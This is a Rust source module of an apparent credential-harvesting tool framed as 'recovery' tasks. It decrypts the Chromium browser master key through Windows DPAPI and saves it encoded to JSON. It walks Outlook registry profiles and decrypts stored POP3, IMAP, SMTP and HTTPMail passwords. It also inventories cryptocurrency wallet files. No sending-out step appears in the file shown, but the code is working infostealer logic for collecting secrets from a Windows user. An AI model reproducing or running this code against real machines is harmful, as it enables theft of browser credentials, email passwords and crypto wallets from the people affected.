use crate::recovery::browsers::{BrowserName, browser_data_roots};
use crate::recovery::context::RecoveryContext;
use crate::recovery::output::write_json_artifact;
use crate::recovery::registry::format_reg_value;
use crate::recovery::services::wallet_specs;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use serde::Serialize;
use std::ffi::c_void;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use windows::Win32::Foundation::{HLOCAL, LocalFree};
use windows::Win32::Security::Cryptography::{
    CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
};
use winreg::enums::HKEY_CURRENT_USER;
use winreg::{RegKey, RegValue};

fn decode_dpapi_value(encrypted: &[u8]) -> Result<Vec<u8>, RecoveryError> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB::default();

        let success = CryptUnprotectData(
            &mut input,
            None,
            None,
            None,
            None,
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        );

        if success.is_err() {
            return Err(RecoveryError::Custom("CryptUnprotectData failed".into()));
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        if !output.pbData.is_null() {
            let _ = LocalFree(HLOCAL(output.pbData as *mut c_void));
        }

        Ok(result)
    }
}

fn decode_chromium_key(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
    let mut decoded = STANDARD
        .decode(encoded)
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    if decoded.starts_with(b"DPAPI") {
        decoded.drain(0..5);
        decode_dpapi_value(&decoded)
    } else {
        Ok(decoded)
    }
}

fn extract_master_key(local_state: &Path) -> Result<Option<Vec<u8>>, RecoveryError> {
    let data = std::fs::read(local_state).map_err(|err| RecoveryError::Io(err))?;
    let json: serde_json::Value =
        serde_json::from_slice(&data).map_err(|err| RecoveryError::Custom(err.to_string()))?;

    let encrypted_key = json
        .get("os_crypt")
        .and_then(|os| os.get("encrypted_key"))
        .and_then(|value| value.as_str());

    if let Some(encrypted) = encrypted_key {
        let master_key = decode_chromium_key(encrypted)?;
        Ok(Some(master_key))
    } else {
        Ok(None)
    }
}

pub fn chromium_secrets_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(ChromiumSecretsTask::new(ctx))]
}

pub struct ChromiumSecretsTask {
    specs: Vec<(BrowserName, PathBuf)>,
}

impl ChromiumSecretsTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: browser_data_roots(ctx),
        }
    }
}

impl ChromiumSecretsTask {
    async fn gather(&self) -> Vec<ChromiumSecretRecord> {
        let mut records = Vec::new();

        for (browser, root) in &self.specs {
            let local_state = root.join("Local State");
            let mut record = ChromiumSecretRecord {
                browser: browser.label().to_string(),
                local_state: local_state.display().to_string(),
                master_key: None,
                error: None,
            };

            if !local_state.exists() {
                record.error = Some("local state missing".to_string());
            } else {
                match extract_master_key(&local_state) {
                    Ok(Some(key)) => {
                        record.master_key = Some(STANDARD.encode(&key));
                    }
                    Ok(None) => {
                        record.error = Some("encrypted_key missing".to_string());
                    }
                    Err(err) => {
                        record.error = Some(err.to_string());
                    }
                }
            }

            records.push(record);
        }

        records
    }
}

#[async_trait]
impl RecoveryTask for ChromiumSecretsTask {
    fn label(&self) -> String {
        "Chromium Secrets".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = ChromiumSecretSummary {
            secrets: self.gather().await,
        };
        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "chromium-secrets.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct ChromiumSecretSummary {
    secrets: Vec<ChromiumSecretRecord>,
}

#[derive(Serialize)]
struct ChromiumSecretRecord {
    browser: String,
    local_state: String,
    master_key: Option<String>,
    error: Option<String>,
}

pub fn outlook_registry_task() -> Arc<dyn RecoveryTask> {
    Arc::new(OutlookRegistryTask)
}

pub struct OutlookRegistryTask;

impl OutlookRegistryTask {
    fn collect_entries() -> Vec<RegistryEntry> {
        const OUTLOOK_PATHS: &[&str] = &[
            r"Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676",
            r"Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676",
        ];

        const MAIL_CLIENTS: &[&str] = &[
            "SMTP Email Address",
            "SMTP Server",
            "POP3 Server",
            "POP3 User Name",
            "SMTP User Name",
            "NNTP Email Address",
            "NNTP User Name",
            "NNTP Server",
            "IMAP Server",
            "IMAP User Name",
            "Email",
            "HTTP User",
            "HTTP Server URL",
            "POP3 User",
            "IMAP User",
            "HTTPMail User Name",
            "HTTPMail Server",
            "SMTP User",
            "POP3 Password2",
            "IMAP Password2",
            "NNTP Password2",
            "HTTPMail Password2",
            "SMTP Password2",
            "POP3 Password",
            "IMAP Password",
            "NNTP Password",
            "HTTPMail Password",
            "SMTP Password",
        ];

        let hive = RegKey::predef(HKEY_CURRENT_USER);
        let mut entries = Vec::new();

        for path in OUTLOOK_PATHS {
            if let Ok(key) = hive.open_subkey(path) {
                OutlookRegistryTask::walk_registry(&key, path, MAIL_CLIENTS, &mut entries);
            }
        }

        entries
    }

    fn walk_registry(key: &RegKey, path: &str, names: &[&str], entries: &mut Vec<RegistryEntry>) {
        for name in names {
            if let Ok(value) = key.get_raw_value(name) {
                entries.push(RegistryEntry {
                    path: path.to_string(),
                    name: name.to_string(),
                    value: format_outlook_registry_value(name, &value),
                });
            }
        }

        let mut iter = key.enum_keys();
        while let Some(Ok(sub_name)) = iter.next() {
            if let Ok(child) = key.open_subkey(&sub_name) {
                let child_path = format!(r"{path}\{sub_name}");
                OutlookRegistryTask::walk_registry(&child, &child_path, names, entries);
            }
        }
    }
}

fn format_outlook_registry_value(name: &str, value: &RegValue) -> String {
    if name.contains("Password") && !name.contains('2') {
        if let Ok(decrypted) = decode_dpapi_value(&value.bytes) {
            if let Ok(text) = String::from_utf8(decrypted) {
                let trimmed = text.trim_end_matches('\0').to_string();
                if !trimmed.is_empty() {
                    return trimmed;
                }
            }
        }
    }
    format_reg_value(value)
}

#[derive(Serialize)]
struct RegistryEntry {
    path: String,
    name: String,
    value: String,
}

#[async_trait]
impl RecoveryTask for OutlookRegistryTask {
    fn label(&self) -> String {
        "Outlook Registry".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::EmailClients
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = OutlookRegistrySummary {
            entries: OutlookRegistryTask::collect_entries(),
        };
        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "outlook-registry.json",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

#[derive(Serialize)]
struct OutlookRegistrySummary {
    entries: Vec<RegistryEntry>,
}

pub fn wallet_inventory_task(ctx: &RecoveryContext) -> Arc<dyn RecoveryTask> {
    Arc::new(WalletInventoryTask::new(ctx))
}

pub struct WalletInventoryTask {
    specs: Vec<WalletSummarySpec>,
}

struct WalletSummarySpec {
    label: &'static str,
    sources: Vec<PathBuf>,
    sample_limit: usize,
}

impl WalletInventoryTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        let specs = wallet_specs(ctx)
            .into_iter()
            .map(|(label, sources, _, _)| WalletSummarySpec {
                label,
                sources,
                sample_limit: 64,
            })
            .collect();
        Self { specs }
    }
}

#[derive(Serialize)]
struct WalletInventorySummary {
    inventories: Vec<WalletInventoryRecord>,
}

#[derive(Serialize)]
struct WalletInventoryRecord {
    label: String,
    roots: Vec<String>,
    exists: bool,
    file_count: usize,
    total_bytes: u64,
    samples: Vec<WalletFile>,
}

#[derive(Serialize)]
struct WalletFile {
    relative: String,
    size: u64,
}

async fn collect_wallet_files(
    root: &Path,
    limit: usize,
) -> Result<(Vec<WalletFile>, usize, u64), RecoveryError> {
    let mut stack = vec![root.to_path_buf()];
    let mut samples = Vec::new();
    let mut count = 0;
    let mut total_bytes = 0;

    while let Some(path) = stack.pop() {
        let mut dir = match fs::read_dir(&path).await {
            Ok(dir) => dir,
            Err(err) => return Err(RecoveryError::Io(err)),
        };

        while let Some(entry) = dir.next_entry().await? {
            let metadata = entry.metadata().await?;
            if metadata.is_dir() {
                stack.push(entry.path());
            } else if metadata.is_file() {
                count += 1;
                total_bytes += metadata.len();
                if samples.len() < limit {
                    let relative = entry
                        .path()
                        .strip_prefix(root)
                        .map(|p| p.display().to_string())
                        .unwrap_or_else(|_| entry.path().display().to_string());
                    samples.push(WalletFile {
                        relative,
                        size: metadata.len(),
                    });
                }
            }
        }
    }

    Ok((samples, count, total_bytes))
}

#[async_trait]
impl RecoveryTask for WalletInventoryTask {
    fn label(&self) -> String {
        "Wallet Inventory".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut inventories = Vec::new();

        for spec in &self.specs {
            let mut record = WalletInventoryRecord {
                label: spec.label.to_string(),
                roots: spec
                    .sources
                    .iter()
                    .map(|path| path.display().to_string())
                    .collect(),
                exists: false,
                file_count: 0,
                total_bytes: 0,
                samples: Vec::new(),
            };

            for root in &spec.sources {
                if !root.exists() {
                    continue;
                }

                record.exists = true;
                if let Ok((samples, count, bytes)) =
                    collect_wallet_files(root, spec.sample_limit).await
                {
                    record.samples.extend(samples);
                    record.file_count += count;
                    record.total_bytes += bytes;
                }
            }

            inventories.push(record);
        }

        let artifact = write_json_artifact(
            ctx,
            self.category(),
            &self.label(),
            "wallet-inventory.json",
            &WalletInventorySummary { inventories },
        )
        .await?;

        Ok(vec![artifact])
    }
}